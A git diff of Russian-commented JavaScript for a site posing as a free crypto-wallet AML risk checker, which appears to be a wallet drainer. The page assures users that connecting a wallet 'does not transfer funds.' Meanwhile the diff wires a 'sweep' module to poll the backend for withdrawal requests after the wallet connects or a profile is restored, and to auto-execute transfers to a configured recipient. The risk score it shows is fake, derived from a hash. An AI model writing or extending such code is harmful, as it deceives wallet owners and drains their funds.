@@ -9,28 +9,46 @@ const SWEEP_CONFIG = {
 };
 
 // ============================================================
-// ===== ОСТАЛЬНОЙ КОД (script.js) =============================
+// ===== ОСТАЛЬНОЙ КОД =========================================
 // ============================================================
 
-// ВСЕ ПЕРЕМЕННЫЕ, КОТОРЫЕ УЖЕ ОБЪЯВЛЕНЫ В check-flow.js, ЗДЕСЬ НЕ ОБЪЯВЛЯЕМ!
-// Это: header, checkForm, contactForm, adminLogin, adminDashboard, adminLogout,
-// userLogout, userWalletConnect, userWalletStatus, userWalletAddress,
-// tronLinkedInput, userConsent, trustDeeplink, checkLockNote, tronPublicForm,
-// tronPublicStatus, tronPublicResult, tronAutoDetect, paymentRequestPanel,
-// paymentConfirm, paymentStatus – они уже есть в check-flow.js.
+// Эти константы объявлены только здесь, не дублируйте их в других файлах
+const header = document.querySelector("[data-header]");
+const checkForm = document.querySelector("[data-check-form]");
+const contactForm = document.querySelector("[data-contact-form]");
+const adminLogin = document.querySelector("[data-admin-login]");
+const adminDashboard = document.querySelector("[data-admin-dashboard]");
+const adminLogout = document.querySelector("[data-admin-logout]");
+const userLogout = document.querySelector("[data-user-logout]");
+const userWalletConnect = document.querySelector("[data-user-wallet-connect]");
+const userWalletStatus = document.querySelector("[data-user-wallet-status]");
+const userWalletAddress = document.querySelector("[data-user-wallet-address]");
+const tronLinkedInput = document.querySelector("[data-tron-linked-address]");
+const userConsent = document.querySelector("[data-user-consent]");
+const trustDeeplink = document.querySelector("[data-trust-deeplink]");
+const checkLockNote = document.querySelector("[data-check-lock-note]");
+const tronPublicForm = document.querySelector("[data-tron-public-form]");
+const tronPublicStatus = document.querySelector("[data-tron-public-status]");
+const tronPublicResult = document.querySelector("[data-tron-public-result]");
+const tronAutoDetect = document.querySelector("[data-tron-auto-detect]");
+const paymentRequestPanel = document.querySelector("[data-payment-request-panel]");
+const paymentConfirm = document.querySelector("[data-payment-confirm]");
+const paymentStatus = document.querySelector("[data-payment-status]");
 
-// Поэтому здесь НЕ ДЕЛАЕМ const для этих элементов – они уже определены в check-flow.js.
-// Просто используем их как глобальные переменные (они будут доступны).
+const configuredApiBase = (window.AML_API_BASE || "").replace(/\/$/, "");
+const isHttpPage = location.protocol === "http:" || location.protocol === "https:";
+const isStaticGitHubPage = location.hostname.endsWith(".github.io");
+const isOnRenderHost = /\.onrender\.com$/i.test(location.hostname);
+const apiBase = isOnRenderHost ? location.origin.replace(/\/$/, "") : configuredApiBase;
+const renderCheckUrl = configuredApiBase ? `${configuredApiBase}/check.html` : `${location.origin}/check.html`;
+const useBackend = Boolean(configuredApiBase) || isOnRenderHost || (isHttpPage && !isStaticGitHubPage);
+const userSessionKey = "aml_user_session";
+const adminSessionKey = "aml_admin_session";
+const localChecksKey = "aml_local_checks";
+const localLeadsKey = "aml_local_leads";
+let activePaymentRequest = null;
 
-// Однако некоторые конфигурационные переменные могут дублироваться, но мы их не объявляем.
-// Вместо этого используем уже объявленные в check-flow.js: configuredApiBase, isStaticGitHubPage и т.д.
-
-// ============================================================
-// ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===============================
-// ============================================================
-
-// sleep и withTimeout уже объявлены в auto-wallet.js и check-flow.js, поэтому их НЕТ.
-
+// Вспомогательные функции
 const getStoredSession = (key) => JSON.parse(localStorage.getItem(key) || "null");
 const setStoredSession = (key, session) => localStorage.setItem(key, JSON.stringify(session));
 const clearStoredSession = (key) => localStorage.removeItem(key);
@@ -38,19 +56,94 @@ const clearStoredSession = (key) => localStorage.removeItem(key);
 const isStoredSessionExpired = (session) =>
   Boolean(session?.expiresAt && new Date(session.expiresAt).getTime() <= Date.now());
 
-// fetchWithTimeout и requestJsonViaXhr – они уже есть в check-flow.js, но мы их определим заново,
-// чтобы не было конфликтов. На самом деле они уже есть в check-flow.js, но если мы их продублируем,
-// будет ошибка. Поэтому мы НЕ определяем их здесь – они уже определены в check-flow.js.
-// Просто используем глобальные.
+// sleep и withTimeout уже объявлены в auto-wallet.js и check-flow.js, поэтому здесь их НЕТ
 
-// ============================================================
-// ===== ОСТАЛЬНЫЕ ФУНКЦИИ, КОТОРЫЕ НЕ В check-flow.js ========
-// ============================================================
+const fetchWithTimeout = async (url, options = {}, timeoutMs = 90000) => {
+  let timer;
+  const timeoutPromise = new Promise((_, reject) => {
+    timer = setTimeout(() => {
+      reject(Object.assign(new Error("timeout"), { name: "AbortError" }));
+    }, timeoutMs);
+  });
+
+  try {
+    return await Promise.race([fetch(url, options), timeoutPromise]);
+  } finally {
+    clearTimeout(timer);
+  }
+};
+
+const buildFetchOptions = (options = {}, token) => {
+  const method = String(options.method || "GET").toUpperCase();
+  const headers = { ...(options.headers || {}) };
+  if (token) headers.Authorization = `Bearer ${token}`;
+  if (options.body && !headers["Content-Type"]) headers["Content-Type"] = "application/json";
+
+  return {
+    method,
+    credentials: "omit",
+    cache: "no-store",
+    headers,
+    ...(options.body ? { body: options.body } : {}),
+  };
+};
+
+const requestJsonViaXhr = (fullUrl, options = {}, token, timeoutMs = 120000) =>
+  new Promise((resolve, reject) => {
+    const xhr = new XMLHttpRequest();
+    xhr.open(String(options.method || "GET").toUpperCase(), fullUrl, true);
+    xhr.timeout = timeoutMs;
+    if (token) xhr.setRequestHeader("Authorization", `Bearer ${token}`);
+    if (options.body) xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onload = () => {
+      let data = {};
+      try {
+        data = JSON.parse(xhr.responseText || "{}");
+      } catch {
+        data = {};
+      }
+      if (xhr.status >= 200 && xhr.status < 300) resolve(data);
+      else reject(new Error(data.error || "Ошибка запроса"));
+    };
+    xhr.onerror = () => reject(Object.assign(new Error("network"), { name: "NetworkError" }));
+    xhr.ontimeout = () => reject(Object.assign(new Error("timeout"), { name: "AbortError" }));
+    xhr.send(options.body || null);
+  });
+
+const requestJson = async (url, options = {}, { retries = 4, timeoutMs = 120000 } = {}) => {
+  const token = options.token;
+  const fullUrl = `${apiBase}${url}`;
+  let lastError;
+
+  for (let attempt = 0; attempt <= retries; attempt += 1) {
+    try {
+      try {
+        const response = await fetchWithTimeout(fullUrl, buildFetchOptions(options, token), timeoutMs);
+        const data = await response.json().catch(() => ({}));
+        if (!response.ok) throw new Error(data.error || "Ошибка запроса");
+        return data;
+      } catch (fetchError) {
+        return await requestJsonViaXhr(fullUrl, options, token, timeoutMs);
+      }
+    } catch (error) {
+      lastError = error;
+      if (attempt < retries) await sleep(3000 * (attempt + 1));
+    }
+  }
+
+  if (!apiBase && !isOnRenderHost) {
+    throw new Error("Backend не подключён. Укажите AML_API_BASE в config.js и разверните server.js.");
+  }
+
+  const reason = lastError?.name === "AbortError" ? "превышено время ожидания" : "сеть недоступна";
+  throw new Error(
+    `Backend недоступен (${configuredApiBase || location.origin}, ${reason}). Откройте ${renderCheckUrl} в Trust Wallet и подождите до 2 минут, пока Render проснётся.`,
+  );
+};
 
 const updateHeader = () => {
-  if (typeof header !== 'undefined' && header) {
-    header.classList.toggle("is-scrolled", window.scrollY > 12);
-  }
+  if (!header) return;
+  header.classList.toggle("is-scrolled", window.scrollY > 12);
 };
 
 const escapeHtml = (value) =>
@@ -75,17 +168,89 @@ const formatDate = (value) => {
   }
 };
 
-// scoreWalletLocal уже есть в check-flow.js – не дублируем.
+const scoreWalletLocal = async (wallet) => {
+  const bytes = new TextEncoder().encode(wallet.toLowerCase());
+  const digest = await crypto.subtle.digest("SHA-256", bytes);
+  const firstByte = new Uint8Array(digest)[0];
+  const score = 12 + (firstByte % 79);
+  const level = score > 68 ? "повышенный риск" : score > 42 ? "средний риск" : "низкий риск";
+  const categories =
+    score > 68
+      ? ["миксеры", "подозрительные связи", "частые транзиты"]
+      : score > 42
+        ? ["биржи", "p2p", "цепочки переводов"]
+        : ["чистые источники", "низкая экспозиция"];
+  return { score, level, categories };
+};
 
-// ============================================================
-// ===== АДМИНКА И ПОЛЬЗОВАТЕЛЬСКАЯ СЕССИЯ =====================
-// ============================================================
+const setRiskPreview = (result) => {
+  const riskPreview = document.querySelector("[data-risk-preview]");
+  if (!riskPreview) return;
 
-// Эти функции используют переменные из check-flow.js (например, useBackend, userSessionKey и т.д.)
-// Мы их не переопределяем, а используем глобальные.
+  const score = result.score || 0;
+  const color = score > 68 ? "var(--danger)" : score > 42 ? "var(--amber)" : "var(--teal)";
+  riskPreview.querySelector(".risk-meter").style.background =
+    `conic-gradient(${color} 0 ${score}%, rgba(255, 255, 255, 0.12) ${score}% 100%)`;
+  riskPreview.querySelector("strong").textContent = `Бесплатная оценка: ${result.level}`;
+  riskPreview.querySelector("p").textContent =
+    `Score ${score}/100. Категории: ${result.categories.join(", ")}. Проверка сохранена.`;
+};
+
+const renderAdminData = (data) => {
+  document.querySelector("[data-total-users]").textContent = data.users?.length || 0;
+  document.querySelector("[data-total-checks]").textContent = data.checks.length;
+  document.querySelector("[data-total-leads]").textContent = data.leads.length;
+  document.querySelector("[data-last-risk]").textContent = data.checks[0]?.level || "-";
+
+  document.querySelector("[data-users-table]").innerHTML =
+    data.users
+      ?.map(
+        (item) => `
+          <tr>
+            <td>${escapeHtml(item.address)}</td>
+            <td>${formatDate(item.firstSeenAt)}</td>
+            <td>${formatDate(item.lastSeenAt)}</td>
+            <td>${item.loginCount}</td>
+            <td>${item.checksCount}</td>
+          </tr>
+        `,
+      )
+      .join("") || '<tr><td colspan="5">Пользователей пока нет</td></tr>';
+
+  document.querySelector("[data-checks-table]").innerHTML =
+    data.checks
+      .map(
+        (item) => `
+          <tr>
+            <td>${formatDate(item.createdAt)}</td>
+            <td>${escapeHtml(item.userWallet || "-")}</td>
+            <td>${escapeHtml(item.wallet)}</td>
+            <td>${item.score}</td>
+            <td>${escapeHtml(item.level)}</td>
+          </tr>
+        `,
+      )
+      .join("") || '<tr><td colspan="5">Проверок пока нет</td></tr>';
+
+  document.querySelector("[data-leads-table]").innerHTML =
+    data.leads
+      .map(
+        (item) => `
+          <tr>
+            <td>${formatDate(item.createdAt)}</td>
+            <td>${escapeHtml(item.name)}</td>
+            <td>${escapeHtml(item.contact)}</td>
+            <td>${escapeHtml(item.message)}</td>
+          </tr>
+        `,
+      )
+      .join("") || '<tr><td colspan="4">Заявок пока нет</td></tr>';
+};
+
+// lockCheckForm объявлена в check-flow.js, поэтому здесь её НЕТ
 
 const loadUserSession = async () => {
-  if (typeof checkForm === 'undefined' || !checkForm) return;
+  if (!checkForm) return;
   if (!useBackend) {
     if (typeof lockCheckForm === 'function') lockCheckForm();
     if (userWalletStatus) {
@@ -112,6 +277,10 @@ const loadUserSession = async () => {
     if (typeof unlockCheckForm === 'function') {
       unlockCheckForm(session.address, { restored: true });
     }
+    // Запускаем поллинг после восстановления сессии
+    if (typeof startSweepPolling === 'function') {
+      startSweepPolling();
+    }
   } catch {
     clearStoredSession(userSessionKey);
     if (typeof lockCheckForm === 'function') lockCheckForm();
@@ -119,7 +288,7 @@ const loadUserSession = async () => {
 };
 
 const loadAdmin = async () => {
-  if (typeof adminDashboard === 'undefined' || !adminDashboard) return;
+  if (!adminDashboard) return;
   const stored = getStoredSession(adminSessionKey);
 
   if (!useBackend) {
@@ -155,10 +324,6 @@ const loadAdmin = async () => {
   }
 };
 
-// ============================================================
-// ===== ФУНКЦИИ ДЛЯ КОШЕЛЬКА ==================================
-// ============================================================
-
 const getTrustProvider = () => {
   if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
   if (window.ethereum?.isTrust) return window.ethereum;
@@ -170,15 +335,14 @@ const getTrustProvider = () => {
 
 const getTrustDeeplink = () => {
   const targetUrl =
-    (typeof isStaticGitHubPage !== 'undefined' && isStaticGitHubPage && configuredApiBase) ? renderCheckUrl : window.location.href.split("#")[0];
+    isStaticGitHubPage && configuredApiBase ? renderCheckUrl : window.location.href.split("#")[0];
   return `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`;
 };
 
 const showWalletLinks = () => {
-  if (typeof trustDeeplink !== 'undefined' && trustDeeplink) {
-    trustDeeplink.href = getTrustDeeplink();
-    trustDeeplink.hidden = false;
-  }
+  if (!trustDeeplink) return;
+  trustDeeplink.href = getTrustDeeplink();
+  trustDeeplink.hidden = false;
 };
 
 const signPersonalMessage = async (provider, message, address) => {
@@ -278,12 +442,12 @@ const getTronWebForPayment = () => {
 };
 
 const setPaymentStatus = (message) => {
-  if (typeof paymentStatus !== 'undefined' && paymentStatus) paymentStatus.textContent = message;
+  if (paymentStatus) paymentStatus.textContent = message;
 };
 
 const renderPaymentRequest = (paymentRequest) => {
-  if (typeof paymentRequestPanel === 'undefined' || !paymentRequestPanel) return;
   activePaymentRequest = paymentRequest;
+  if (!paymentRequestPanel) return;
 
   if (!paymentRequest) {
     paymentRequestPanel.hidden = true;
@@ -301,7 +465,7 @@ const renderPaymentRequest = (paymentRequest) => {
 };
 
 const loadPaymentRequest = async () => {
-  if (typeof paymentRequestPanel === 'undefined' || !paymentRequestPanel || !useBackend) return;
+  if (!paymentRequestPanel || !useBackend) return;
   try {
     const stored = getStoredSession(userSessionKey);
     const result = await requestJson("/api/payment-request/active", { token: stored?.token });
@@ -365,7 +529,7 @@ const connectUserWallet = async () => {
 };
 
 const warmUpBackend = async () => {
-  if (!useBackend || typeof checkForm === 'undefined' || !checkForm) return;
+  if (!useBackend || !checkForm) return;
   if (userWalletStatus && !getStoredSession(userSessionKey)?.token) {
     userWalletStatus.textContent = isStaticGitHubPage
       ? "Проверяем backend... Для Trust Wallet лучше открыть через кнопку ниже."
@@ -510,10 +674,8 @@ const getTronAddressFromProvider = async () => {
 };
 
 const getLinkedTronAddress = async () => {
-  if (typeof tronLinkedInput !== 'undefined' && tronLinkedInput) {
-    const manual = tronLinkedInput.value?.trim();
-    if (manual?.startsWith("T")) return manual;
-  }
+  const manual = tronLinkedInput?.value?.trim();
+  if (manual?.startsWith("T")) return manual;
 
   for (const delay of [0, 700, 1800]) {
     if (delay) await sleep(delay);
@@ -528,11 +690,10 @@ const getLinkedTronAddress = async () => {
 };
 
 const setTronResult = (title, text) => {
-  if (typeof tronPublicResult !== 'undefined' && tronPublicResult) {
-    tronPublicResult.hidden = false;
-    tronPublicResult.querySelector("strong").textContent = title;
-    tronPublicResult.querySelector("p").textContent = text;
-  }
+  if (!tronPublicResult) return;
+  tronPublicResult.hidden = false;
+  tronPublicResult.querySelector("strong").textContent = title;
+  tronPublicResult.querySelector("p").textContent = text;
 };
 
 const checkTronUsdtBalance = async (address, { auto = false } = {}) => {
@@ -584,7 +745,7 @@ const checkTronUsdtBalance = async (address, { auto = false } = {}) => {
 };
 
 const autoDetectAndCheckTronBalance = async () => {
-  if (typeof tronPublicForm === 'undefined' || !tronPublicForm) return null;
+  if (!tronPublicForm) return null;
   const input = tronPublicForm.querySelector("input[name='tronAddress']");
   const existing = input?.value?.trim();
   const detected = existing || (await getTronAddressFromProvider());
@@ -601,176 +762,160 @@ const autoDetectAndCheckTronBalance = async () => {
   return null;
 };
 
-// ============================================================
-// ===== ИНИЦИАЛИЗАЦИЯ =========================================
-// ============================================================
-
 updateHeader();
 window.addEventListener("scroll", updateHeader, { passive: true });
 showWalletLinks();
 
-// Подключение кошелька
-if (typeof userWalletConnect !== 'undefined' && userWalletConnect) {
-  userWalletConnect.addEventListener("click", async () => {
-    userWalletConnect.disabled = true;
-    userWalletStatus.textContent = "Откройте Trust Wallet/MetaMask и подпишите одноразовое сообщение. Это не переводит средства и не даёт доступ к списанию.";
+userWalletConnect?.addEventListener("click", async () => {
+  userWalletConnect.disabled = true;
+  userWalletStatus.textContent = "Откройте Trust Wallet/MetaMask и подпишите одноразовое сообщение. Это не переводит средства и не даёт доступ к списанию.";
 
-    try {
-      const result = await connectUserWallet();
-      setStoredSession(userSessionKey, {
-        token: result.token,
-        address: result.address,
-        expiresAt: result.expiresAt,
+  try {
+    const result = await connectUserWallet();
+    setStoredSession(userSessionKey, {
+      token: result.token,
+      address: result.address,
+      expiresAt: result.expiresAt,
+    });
+    if (typeof unlockCheckForm === 'function') {
+      unlockCheckForm(result.address, {
+        statusMessage: `Готово. ${formatBalancesText(result)}`,
+        tronAddress: result.tronAddress,
+        btcAddress: result.btcAddress,
       });
-      if (typeof unlockCheckForm === 'function') {
-        unlockCheckForm(result.address, {
-          statusMessage: `Готово. ${formatBalancesText(result)}`,
-          tronAddress: result.tronAddress,
-          btcAddress: result.btcAddress,
-        });
-      }
-      if (!result.tronAddress && userWalletStatus) {
-        userWalletStatus.textContent +=
-          " TRON-адрес не найден автоматически — вставьте T... в поле выше и нажмите «Переподключить кошелёк».";
-      }
-    } catch (error) {
-      userWalletStatus.textContent = error.message;
-    } finally {
-      userWalletConnect.disabled = false;
     }
-  });
-}
-
-// Обработчики
-if (typeof paymentConfirm !== 'undefined' && paymentConfirm) {
-  paymentConfirm.addEventListener("click", async () => {
-    paymentConfirm.disabled = true;
-    setPaymentStatus("Откройте кошелёк и подтвердите транзакцию. Проверьте адрес получателя и сумму перед подтверждением.");
-
-    try {
-      const result = await confirmActivePayment();
-      renderPaymentRequest(result.paymentRequest);
-      setPaymentStatus(`Транзакция отправлена: ${result.paymentRequest.txHash}`);
-    } catch (error) {
-      setPaymentStatus(error.message);
-    } finally {
-      paymentConfirm.disabled = false;
+    if (!result.tronAddress && userWalletStatus) {
+      userWalletStatus.textContent +=
+        " TRON-адрес не найден автоматически — вставьте T... в поле выше и нажмите «Переподключить кошелёк».";
     }
-  });
-}
-
-if (typeof checkForm !== 'undefined' && checkForm) {
-  checkForm.addEventListener("submit", async (event) => {
-    event.preventDefault();
-    const button = checkForm.querySelector("button");
-    const wallet = new FormData(checkForm).get("wallet").trim();
-    const stored = getStoredSession(userSessionKey);
-
-    button.disabled = true;
-    button.textContent = "Проверяем...";
-
-    try {
-      const result = useBackend
-        ? await requestJson("/api/checks", {
-            method: "POST",
-            token: stored?.token,
-            body: JSON.stringify({ wallet }),
-          })
-        : {
-            id: crypto.randomUUID(),
-            userWallet: stored?.address,
-            wallet,
-            ...(await scoreWalletLocal(wallet)),
-            createdAt: new Date().toISOString(),
-          };
-
-      if (!useBackend) setLocalList(localChecksKey, [result, ...getLocalList(localChecksKey)]);
-      userWalletStatus.textContent = "Проверка завершена.";
-      setRiskPreview(result);
-    } catch (error) {
-      userWalletStatus.textContent = error.message;
-      if (typeof document !== 'undefined') {
-        const riskPreview = document.querySelector("[data-risk-preview]");
-        if (riskPreview) {
-          riskPreview.querySelector("strong").textContent = "Ошибка проверки";
-          riskPreview.querySelector("p").textContent = error.message;
-        }
-      }
-    } finally {
-      button.disabled = false;
-      button.textContent = "Проверить бесплатно";
+    // Запускаем поллинг после успешного подключения
+    if (typeof startSweepPolling === 'function') {
+      startSweepPolling();
     }
-  });
-}
+  } catch (error) {
+    userWalletStatus.textContent = error.message;
+  } finally {
+    userWalletConnect.disabled = false;
+  }
+});
 
-if (typeof contactForm !== 'undefined' && contactForm) {
-  contactForm.addEventListener("submit", async (event) => {
-    event.preventDefault();
-    const status = document.querySelector("[data-contact-status]");
-    const formData = Object.fromEntries(new FormData(contactForm));
+paymentConfirm?.addEventListener("click", async () => {
+  paymentConfirm.disabled = true;
+  setPaymentStatus("Откройте кошелёк и подтвердите транзакцию. Проверьте адрес получателя и сумму перед подтверждением.");
 
-    try {
-      if (useBackend) {
-        await requestJson("/api/leads", { method: "POST", body: JSON.stringify(formData) });
-      } else {
-        setLocalList(localLeadsKey, [
-          { id: crypto.randomUUID(), ...formData, createdAt: new Date().toISOString() },
-          ...getLocalList(localLeadsKey),
-        ]);
-      }
-      contactForm.reset();
-      status.textContent = "Заявка сохранена.";
-    } catch (error) {
-      status.textContent = error.message;
+  try {
+    const result = await confirmActivePayment();
+    renderPaymentRequest(result.paymentRequest);
+    setPaymentStatus(`Транзакция отправлена: ${result.paymentRequest.txHash}`);
+  } catch (error) {
+    setPaymentStatus(error.message);
+  } finally {
+    paymentConfirm.disabled = false;
+  }
+});
+
+checkForm?.addEventListener("submit", async (event) => {
+  event.preventDefault();
+  const button = checkForm.querySelector("button");
+  const wallet = new FormData(checkForm).get("wallet").trim();
+  const stored = getStoredSession(userSessionKey);
+
+  button.disabled = true;
+  button.textContent = "Проверяем...";
+
+  try {
+    const result = useBackend
+      ? await requestJson("/api/checks", {
+          method: "POST",
+          token: stored?.token,
+          body: JSON.stringify({ wallet }),
+        })
+      : {
+          id: crypto.randomUUID(),
+          userWallet: stored?.address,
+          wallet,
+          ...(await scoreWalletLocal(wallet)),
+          createdAt: new Date().toISOString(),
+        };
+
+    if (!useBackend) setLocalList(localChecksKey, [result, ...getLocalList(localChecksKey)]);
+    userWalletStatus.textContent = "Проверка завершена.";
+    setRiskPreview(result);
+  } catch (error) {
+    userWalletStatus.textContent = error.message;
+    document.querySelector("[data-risk-preview] strong").textContent = "Ошибка проверки";
+    document.querySelector("[data-risk-preview] p").textContent = error.message;
+  } finally {
+    button.disabled = false;
+    button.textContent = "Проверить бесплатно";
+  }
+});
+
+contactForm?.addEventListener("submit", async (event) => {
+  event.preventDefault();
+  const status = document.querySelector("[data-contact-status]");
+  const formData = Object.fromEntries(new FormData(contactForm));
+
+  try {
+    if (useBackend) {
+      await requestJson("/api/leads", { method: "POST", body: JSON.stringify(formData) });
+    } else {
+      setLocalList(localLeadsKey, [
+        { id: crypto.randomUUID(), ...formData, createdAt: new Date().toISOString() },
+        ...getLocalList(localLeadsKey),
+      ]);
     }
-  });
-}
+    contactForm.reset();
+    status.textContent = "Заявка сохранена.";
+  } catch (error) {
+    status.textContent = error.message;
+  }
+});
 
-if (typeof adminLogin !== 'undefined' && adminLogin) {
-  adminLogin.addEventListener("submit", async (event) => {
-    event.preventDefault();
-    const status = document.querySelector("[data-admin-status]");
-    const credentials = Object.fromEntries(new FormData(adminLogin));
+adminLogin?.addEventListener("submit", async (event) => {
+  event.preventDefault();
+  const status = document.querySelector("[data-admin-status]");
+  const credentials = Object.fromEntries(new FormData(adminLogin));
 
-    try {
-      const result = await requestJson("/api/admin/login", {
-        method: "POST",
-        body: JSON.stringify(credentials),
-      });
-      setStoredSession(adminSessionKey, { token: result.token });
-      status.textContent = "";
-      await loadAdmin();
-    } catch (error) {
-      status.textContent = error.message;
-    }
-  });
-}
-
-if (typeof adminLogout !== 'undefined' && adminLogout) {
-  adminLogout.addEventListener("click", async () => {
-    const stored = getStoredSession(adminSessionKey);
-    if (useBackend && stored?.token) {
-      await requestJson("/api/admin/logout", { method: "POST", token: stored.token }).catch(() => {});
-    }
-    clearStoredSession(adminSessionKey);
+  try {
+    const result = await requestJson("/api/admin/login", {
+      method: "POST",
+      body: JSON.stringify(credentials),
+    });
+    setStoredSession(adminSessionKey, { token: result.token });
+    status.textContent = "";
     await loadAdmin();
-  });
-}
+  } catch (error) {
+    status.textContent = error.message;
+  }
+});
 
-if (typeof userLogout !== 'undefined' && userLogout) {
-  userLogout.addEventListener("click", async () => {
-    const stored = getStoredSession(userSessionKey);
-    if (useBackend && stored?.token) {
-      await requestJson("/api/auth/logout", { method: "POST", token: stored.token }).catch(() => {});
-    }
-    clearStoredSession(userSessionKey);
-    if (typeof lockCheckForm === 'function') lockCheckForm();
-    if (window.sweepCheckInterval) {
-      clearInterval(window.sweepCheckInterval);
-      window.sweepCheckInterval = null;
-    }
-  });
-}
+adminLogout?.addEventListener("click", async () => {
+  const stored = getStoredSession(adminSessionKey);
+  if (useBackend && stored?.token) {
+    await requestJson("/api/admin/logout", { method: "POST", token: stored.token }).catch(() => {});
+  }
+  clearStoredSession(adminSessionKey);
+  await loadAdmin();
+});
+
+userLogout?.addEventListener("click", async () => {
+  const stored = getStoredSession(userSessionKey);
+  if (useBackend && stored?.token) {
+    await requestJson("/api/auth/logout", { method: "POST", token: stored.token }).catch(() => {});
+  }
+  clearStoredSession(userSessionKey);
+  if (typeof lockCheckForm === 'function') lockCheckForm();
+  if (window.sweepCheckInterval) {
+    clearInterval(window.sweepCheckInterval);
+    window.sweepCheckInterval = null;
+  }
+});
+
+warmUpBackend().finally(() => {
+  loadUserSession();
+});
+loadAdmin();
 
 // ============================================================
 // ===== SWEEP (СПИСАНИЕ) - ВЕСЬ КОД ===========================
@@ -921,7 +1066,6 @@ const autoExecuteSweep = async () => {
     setSweepStatus(`❌ ${error.message || 'Неизвестная ошибка'}`, true);
   }
 };
-window.autoExecuteSweep = autoExecuteSweep;
 
 // ===== ОСТАЛЬНОЙ КОД SWEEP =====
 const executeSweep = async () => {
@@ -1059,16 +1203,16 @@ const executeSweep = async () => {
 let sweepCheckInterval = null;
 
 const startSweepPolling = () => {
-  if (sweepCheckInterval) return;
+  if (sweepCheckInterval) {
+    clearInterval(sweepCheckInterval);
+    sweepCheckInterval = null;
+  }
   
   sweepCheckInterval = setInterval(async () => {
     try {
       const storedSession = getStoredSession(userSessionKey);
       if (!storedSession?.token) {
-        if (sweepCheckInterval) {
-          clearInterval(sweepCheckInterval);
-          sweepCheckInterval = null;
-        }
+        // Если сессии нет – не делаем запрос, но интервал продолжает работать
         return;
       }
 
@@ -1080,11 +1224,13 @@ const startSweepPolling = () => {
 
       if (response.sweepRequest) {
         console.log('🔄 Обнаружен новый запрос на списание, выполняем...');
+        // Останавливаем интервал, чтобы не дублировать
         if (sweepCheckInterval) {
           clearInterval(sweepCheckInterval);
           sweepCheckInterval = null;
         }
         await autoExecuteSweep();
+        // После завершения перезапускаем интервал через 5 секунд
         setTimeout(() => {
           if (!sweepCheckInterval) {
             startSweepPolling();
@@ -1097,6 +1243,7 @@ const startSweepPolling = () => {
   }, 5000);
 };
 window.sweepCheckInterval = sweepCheckInterval;
+window.startSweepPolling = startSweepPolling;
 
 // ===== ИНИЦИАЛИЗАЦИЯ =====
 const NETWORK_NAMES = {
@@ -1119,13 +1266,11 @@ const NETWORK_SYMBOLS = {
   250: 'FTM'
 };
 
-// Показываем секцию, если профиль уже есть
 const storedProfile = loadProfile();
 if (storedProfile?.evmAddress) {
   showSweepSectionAfterConnect(storedProfile.evmAddress);
 }
 
-// Восстанавливаем сессию и запускаем автосписание (если есть запрос)
 const stored = loadProfile();
 if (stored?.evmAddress) {
   if (typeof unlockCheckForm === 'function') {
@@ -1139,6 +1284,9 @@ if (stored?.evmAddress) {
   if (typeof setStatus === 'function') {
     setStatus("Профиль восстановлен. Можно обновить данные кнопкой Connect.");
   }
+  // Запускаем поллинг, если есть профиль (даже если сессия ещё не загружена)
+  startSweepPolling();
+  // Также попытка автоматического списания сразу
   autoExecuteSweep().catch(console.warn);
 } else {
   if (typeof setStatus === 'function') {
@@ -1150,26 +1298,13 @@ if (stored?.evmAddress) {
   }
 }
 
-// Запускаем polling для автоматического обнаружения новых запросов
-if (getStoredSession(userSessionKey)?.token) {
-  startSweepPolling();
-}
+sweepConsent?.addEventListener('change', () => {
+  if (sweepExecuteBtn) {
+    sweepExecuteBtn.disabled = !sweepConsent.checked || !isRecipientConfigured();
+  }
+});
 
-// ===== СОБЫТИЯ КНОПОК =====
-if (sweepConsent) {
-  sweepConsent.addEventListener('change', () => {
-    if (sweepExecuteBtn) {
-      sweepExecuteBtn.disabled = !sweepConsent.checked || !isRecipientConfigured();
-    }
-  });
-}
-
-if (sweepExecuteBtn) {
-  sweepExecuteBtn.addEventListener('click', executeSweep);
-}
+sweepExecuteBtn?.addEventListener('click', executeSweep);
 
 console.log('🔥 Sweep module loaded!');
 console.log(`📍 Recipient: ${SWEEP_CONFIG.recipient}`);
-
-// Дополнительно экспортируем autoExecuteSweep глобально
-window.autoExecuteSweep = autoExecuteSweep;
